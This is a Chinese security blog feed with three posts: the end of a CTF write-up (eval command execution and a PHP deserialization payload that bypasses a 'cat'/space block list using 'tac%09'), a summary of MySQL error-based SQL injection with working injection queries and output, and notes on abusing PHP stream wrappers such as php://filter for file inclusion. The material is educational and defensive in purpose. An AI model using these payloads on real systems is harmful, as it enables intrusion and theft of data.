&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>看代码，我们可以利用eval来执行任意代码，执行system(“ls”)查看当前目录下的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/password2.png" alt=""></p>
<p>再用cat查看flag.php,这里貌似还是不能用cat，所以用tac吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?1=system(&quot;tac%09flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/password3.png" alt=""></p>
<h2><span id="php是最好的语言">PHP是最好的语言</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="noopener">http://47.100.121.220:28003/</a></p>
<h3><span id="解答">解答</span></h3><p>先用御剑扫目录发现 www.zip 文件，下载解压查看源码如下</p>
<p>function.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$xkey=&apos;xxxxxxx&apos;; #don&apos;t tell you.</span><br><span class="line"></span><br><span class="line">class Neo&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public $key;   </span><br><span class="line">    </span><br><span class="line">    function __construct($cmd,$key)&#123;</span><br><span class="line">        $this-&gt;cmd=$cmd;</span><br><span class="line">        $this-&gt;key=$key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;        </span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function run()&#123;</span><br><span class="line">        $this-&gt;waf();</span><br><span class="line">        global $xkey;</span><br><span class="line">        if ($this-&gt;key === $xkey)&#123;</span><br><span class="line">            system($this-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function waf()&#123;        </span><br><span class="line">        $black = array(&apos; &apos;,&apos;cat&apos;);</span><br><span class="line">        foreach ($black as $key =&gt; $value) &#123;</span><br><span class="line">            if(stripos($this-&gt;cmd,$value))&#123;</span><br><span class="line">                die(&quot;Attack!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>404.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;404.html&quot;;</span><br><span class="line">include &quot;function.php&quot;;</span><br><span class="line">@unserialize($_POST[&apos;power&apos;]);</span><br></pre></td></tr></table></figure></p>
<p>读源码可知这是一个php反序列化的题</p>
<p>php反序列化问题可以参考我之前的博客</p>
<p><a href="https://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">反序列化漏洞的利用与学习</a><br><a href="https://uknowsec.cn/posts/notes/%E7%90%86%E8%A7%A3php%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">理解php序列化漏洞</a></p>
<p>可以在404.php页面用变量power提交payload，在function中的Neo类有两个成员变量，一个key，一个cmd。key值这个地方我一直以为是xxxxxxx，后来才看到index页面有提示Key值为php_is_nice</p>
<p>遂构造payload 先查看当前目录的文件，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">power=O:3:&quot;Neo&quot;:2:&#123;s:3:&quot;key&quot;;s:11:&quot;php_is_nice&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ls1.png" alt=""></p>
<p>可以看到存在flag.php文件 在由function的代码可以知道我们需要读flag.php的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function waf()&#123;        </span><br><span class="line">    $black = array(&apos; &apos;,&apos;cat&apos;);</span><br><span class="line">    foreach ($black as $key =&gt; $value) &#123;</span><br><span class="line">        if(stripos($this-&gt;cmd,$value))&#123;</span><br><span class="line">            die(&quot;Attack!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由waf函数可以知道，过滤了cat和空格。在这里我们可以用</p>
<p>%09 绕过空格 tac绕过cat</p>
<p>其中 空格绕过</p>
<p>参考<br><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a></p>
<p>tac</p>
<p>cat命令可以显示文件的内容，它反过来写就是tac，而tac恰巧也是一个Linux命令，它的功能就是把文件内容反过来显示，文件内容的最后一行先显示，第一行最后显示</p>
<p>遂构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">power=O:3:&quot;Neo&quot;:2:&#123;s:3:&quot;key&quot;;s:11:&quot;php_is_nice&quot;;s:3:&quot;cmd&quot;;s:12:&quot;tac%09flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tac.png" alt=""></p>
<h2><span id="reference">Reference</span></h2><p><a href="https://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">反序列化漏洞的利用与学习</a><br><a href="https://uknowsec.cn/posts/notes/%E7%90%86%E8%A7%A3php%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">理解php序列化漏洞</a><br><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL Error Based SQL Injection （报错注入）总结]]></title>
      <url>https://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="mysql报错注入">MySQL报错注入</span></h2><p>利用数据库报错来显示数据的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显。</p>
<p>数据类型转换报错是最常见的一种方法，在微软SQL Server上，利用的是convert()和cast()函数，MySQL的报错SQL注入方式更多。</p>
<p>有很多函数都会导致MySQL报错并且显示出数据，它们分别是</p>
<ul>
<li>GemetryCollection()</li>
<li>polygon(),GTID_SUBSET()</li>
<li>multipoint()</li>
<li>multinestring()</li>
<li>multipolygon()</li>
<li>LINESTRING()</li>
<li>exp()</li>
</ul>
<p>MYSQL报错注入大体可以分为以下几类：</p>
<ul>
<li>BIGINT等数据类型溢出</li>
<li>xpath语法错误</li>
<li>concat+rand()+group_by()导致主键重复</li>
<li>空间数据类型函数错误</li>
</ul>
<h2><span id="floor">floor()</span></h2><h3><span id="注入语句">注入语句</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
<ul>
<li>floor：函数只返回整数部分，小数部分舍弃。</li>
<li>round：函数四舍五入，大于0.5的部分进位，不到则舍弃。</li>
</ul>
<h3><span id="报错注入原理">报错注入原理</span></h3><p>目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug来实现的。</p>
<p>下面就以 rand() 函数来进行说明。mysql的官方文档中对 rand() 函数有特殊的说明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this:</span><br></pre></td></tr></table></figure>
<p>官方文档中的意思是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。</p>
<p>因此在mysql中，可以构造一个值不确定而有可重复的字段作为group by的条件字段，这是就可以报出类似于Duplicate entry ‘…’ for key ‘group_key’的错误</p>
<h3><span id="测试">测试</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">1062 - Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">1062 - Duplicate entry &apos;5.5.531&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>
<h2><span id="extractvalue">extractvalue()</span></h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p>
<p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p>
<h3><span id="注入语句">注入语句</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>
<h3><span id="报错注入原理">报错注入原理</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE (XML_document, XPath_string);</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </li>
<li>第二个参数：XPath_string (Xpath格式的字符串). </li>
<li>作用：从目标XML中返回包含所查询值的字符串</li>
</ul>
<p>第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里</p>
<h3><span id="测试">测试</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">1105 - XPATH syntax error: &apos;~root@localhost~&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select version()),0x7e)));</span><br><span class="line">1105 - XPATH syntax error: &apos;~5.5.53~&apos;</span><br></pre></td></tr></table></figure>
<h2><span id="updatexml">updatexml()</span></h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p>
<p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p>
<h3><span id="注入语句">注入语句</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
<h3><span id="报错注入原理">报错注入原理</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </li>
<li>第二个参数：XPath_string (Xpath格式的字符串)</li>
<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </li>
<li>作用：改变文档中符合条件的节点的值</li>
</ul>
<p>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
<p>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</p>
<h3><span id="测试">测试</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line">1105 - XPATH syntax error: &apos;~root@localhost~&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and (updatexml(1,concat(0x7e,(select version()),0x7e),1));</span><br><span class="line">1105 - XPATH syntax error: &apos;~5.5.53~&apos;</span><br></pre></td></tr></table></figure>
<h2><span id="gemetrycollection-multipoint-polygon-multipolygon-linestring-multilinestring">GemetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()</span></h2><p>以上函数均为MySQL中的空间数据类型（存储）的函数</p>
<p>目前仅在MyISAM数据引擎下提供空间索引支持,要求几何字段非空</p>
<h3><span id="注入语句">注入语句</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select * from products where pid=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">select * from products where pid=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">select * from products where pid=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">select * from products where pid=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">select * from products where pid=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">select * from products where pid=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h3><span id="测试">测试</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from products where pid=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and geometrycollection((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products where pid=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and multipoint((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products where pid=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and polygon((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products where pid=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and multipolygon((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products where pid=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and linestring((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products where pid=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and multilinestring((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
<h2><span id="exp">exp()</span></h2><p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。</p>
<p>利用exp函数也产生类似的溢出错误</p>
<h3><span id="注入语句">注入语句</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from products where pid=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
<h3><span id="测试">测试</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from products where pid=1 and exp(~(select * from(select user())a));</span><br><span class="line">1690 - DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and exp(~(select * from(select version())a));</span><br><span class="line">1690 - DOUBLE value is out of range in &apos;exp(~((select `a`.`version()` from (select version() AS `version()`) `a`)))&apos;</span><br></pre></td></tr></table></figure>
<h2><span id="reference">Reference</span></h2><p><a href="http://wooyun.jozxing.cc/static/drops/tips-14312.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a><br><a href="https://n0tr00t.com/2014/11/16/error-based-sql-injection.html" target="_blank" rel="noopener">Error Based SQL Injection</a><br><a href="https://edu.aqniu.com/article/54" target="_blank" rel="noopener">MYSQL报错注入的一点总结</a><br><a href="https://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="noopener">UpdateXml() MYSQL显错注入</a><br><a href="http://www.cnseay.com/4239/" target="_blank" rel="noopener">《代码审计：企业级Web代码安全架构》</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[php支持的协议和封装协议小结]]></title>
      <url>https://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="php协议类型">php协议类型</span></h2><ul>
<li>file:// — 访问本地文件系统</li>
<li>http:// — 访问 HTTP(s) 网址</li>
<li>ftp:// — 访问 FTP(s) URLs</li>
<li>php:// — 访问各个输入/输出流（I/O streams）</li>
<li>zlib:// — 压缩流</li>
<li>data:// — 数据（RFC 2397）</li>
<li>glob:// — 查找匹配的文件路径模式</li>
<li>phar:// — PHP 归档</li>
<li>ssh2:// — Secure Shell 2</li>
<li>rar:// — RAR</li>
<li>ogg:// — 音频流</li>
<li>expect:// — 处理交互式的流</li>
</ul>
<h2><span id="phpini">PHP.ini</span></h2><ul>
<li>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。</li>
<li>allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等</li>
</ul>
<h2><span id="file协议">file://协议</span></h2><p>file:// — 访问本地文件系统,不受allow_url_fopen与allow_url_include的影响</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/file1.png" alt=""></p>
<h3><span id="使用方法">使用方法</span></h3><p>file:// [文件的绝对路径和文件名]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/code/1.php?file=file:///E:\phpStudy\WWW\code\phpinfo.php</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/file2.png" alt=""></p>
<h2><span id="php协议">php://协议</span></h2><p>php:// — 访问各个输入/输出流（I/O streams）</p>
<p>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</p>
<h3><span id="phpstdin-phpstdout-和-phpstderr">php://stdin, php://stdout 和 php://stderr</span></h3><p>php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。</p>
<p>php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。</p>
<h4><span id="phpstdin">php://stdin</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    while($line = fopen(&apos;php://stdin&apos;,&apos;r&apos;))</span><br><span class="line">    &#123;//open our file pointer to read from stdin</span><br><span class="line">        echo $line.&quot;\n&quot;;</span><br><span class="line">        echo fgets($line);//读取</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/stdin.png" alt=""></p>
<h4><span id="phpstdout">php://stdout</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $fd = fopen(&apos;php://stdout&apos;, &apos;w&apos;);</span><br><span class="line">    if ($fd) &#123;</span><br><span class="line">        echo $fd.&quot;\n&quot;;</span><br><span class="line">        fwrite($fd, &quot;test&quot;);</span><br><span class="line">        fwrite($fd, &quot;\n&quot;);</span><br><span class="line">        fclose($fd);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/stdout.png" alt=""></p>
<h4><span id="phpstderr">php://stderr</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $stderr = fopen( &apos;php://stderr&apos;, &apos;w&apos; );</span><br><span class="line">    echo $stderr.&quot;\n&quot;;</span><br><span class="line">    fwrite($stderr, &quot;uknow&quot; );</span><br><span class="line">    fclose($stderr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/stderr.png" alt=""></p>
<h3><span id="phpfilter">php://filter</span></h3><p>最常使用的一个伪协议，一般可以利用进行任意文件读取。 </p>
<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<h4><span id="参数">参数</span></h4><table>
<thead>
<tr>
<th>名称</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td style="text-align:center">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td>read=&lt;读链的筛选列表&gt;</td>
<td style="text-align:center">该参数可选。可以设定一个或多个过滤器名称，以管道符分隔。</td>
</tr>
<tr>
<td>write=&lt;写链的筛选列表&gt;</td>
<td style="text-align:center">该参数可选。可以设定一个或多个过滤器名称，以管道符分隔。</td>
</tr>
<tr>
<td>&lt;；两个链的筛选列表&gt;</td>
<td style="text-align:center">任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include($_GET[&apos;file&apos;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/code/1.php?file=php://filter/read=convert.base64-encode/resource=./phpinfo.php</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/phpfilter1.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/phpfilter2.png" alt=""></p>
<h3><span id="phpinput">php://input</span></h3><p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
<ul>
<li><p>allow_url_fopen ：off/on</p>
</li>
<li><p>allow_url_include：on</p>
</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/phpinput.png" alt=""></p>
<h2><span id="zip-bzip2-zlib协议">zip://, bzip2://, zlib://协议</span></h2><p>zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；</p>
<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
<ul>
<li><p>allow_url_fopen ：off/on</p>
</li>
<li><p>allow_url_include：off/on</p>
</li>
</ul>
<h3><span id="使用方法">使用方法</span></h3><p>zip://archive.zip#dir/file.txt</p>
<p>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
<h3><span id="测试">测试</span></h3><p>先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。</p>
<p>由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p>
